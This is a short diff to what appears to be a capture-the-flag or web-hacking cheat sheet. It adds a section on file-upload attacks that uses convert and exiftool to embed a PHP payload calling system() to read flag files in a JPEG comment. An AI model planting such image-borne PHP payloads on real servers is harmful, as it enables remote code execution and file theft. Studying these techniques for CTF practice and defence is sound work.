@@ -66,6 +66,19 @@ TODO
 
 TODO
 
+### File Uploads
+
+### Crafting Custom Images
+
+Image manipulation on the command-line makes crafting payloads a little bit easier:
+```sh
+# create an empty image
+convert -size 32x32 xc:white empty.jpg
+
+# add a comment to an image
+exiftool -Comment $'<?php system("cat fl* /fl* /home/*/fl*"); ?>' empty.jpg
+```
+
 ### Nginx Knowledge
 
 TODO: well-known path bypass
